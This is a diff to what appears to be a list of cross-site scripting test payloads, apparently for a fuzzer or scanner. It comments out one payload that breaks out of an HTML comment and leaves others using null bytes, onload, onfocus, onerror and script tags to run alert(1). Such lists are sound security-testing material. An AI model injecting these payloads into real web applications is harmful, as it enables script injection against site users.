@@ -11,7 +11,9 @@
 
 %00<body onload=alert(1)>
 &#00;</form><input type&#61;"date" onfocus="alert(1)">
---><!-- --%00> <img src=xxx:x onerror=javascript:alert(1)> -->
+
+# not doing XSS inside a comment
+# --><!-- --%00> <img src=xxx:x onerror=javascript:alert(1)> -->
 "'`><%00img src=xxx:x onerror=javascript:alert(1)>
 %00“><script>alert(1)</script>
 '`"><%00script>javascript:alert(1)</script>
